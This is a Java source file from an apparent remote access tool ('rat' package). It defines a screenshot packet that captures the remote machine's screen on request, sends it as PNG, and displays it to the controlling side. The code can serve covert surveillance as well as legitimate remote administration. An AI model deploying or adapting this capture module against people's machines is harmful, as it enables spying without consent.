/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import java.awt.image.BufferedImage;

import de.sogomn.engine.Screen;
import de.sogomn.engine.Screen.ResizeBehavior;
import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.FrameEncoder;

public final class ScreenshotPacket extends AbstractPingPongPacket {
	
	private BufferedImage image;
	
	private static final BufferedImage NO_IMAGE = new BufferedImage(10, 10, BufferedImage.TYPE_INT_RGB);
	private static final int SCREEN_WIDTH = 800;
	private static final int SCREEN_HEIGHT = 600;
	
	public ScreenshotPacket() {
		type = REQUEST;
		image = NO_IMAGE;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		final byte[] data = ImageUtils.toByteArray(image, "PNG");
		
		connection.writeInt(data.length);
		connection.write(data);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		final int length = connection.readInt();
		final byte[] data = new byte[length];
		
		connection.read(data);
		
		image = ImageUtils.toImage(data);
		
		if (image == null) {
			image = NO_IMAGE;
		}
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		image = FrameEncoder.takeScreenshot();
		
		if (image == null) {
			image = NO_IMAGE;
		}
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		final int width = image.getWidth();
		final int height = image.getHeight();
		
		final Screen screen = new Screen(width, height);
		
		screen.addListener(g -> {
			g.drawImage(image, 0, 0, null);
		});
		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
		screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
		screen.show();
		screen.redraw();
	}
	
	public BufferedImage getImage() {
		return image;
	}
	
}
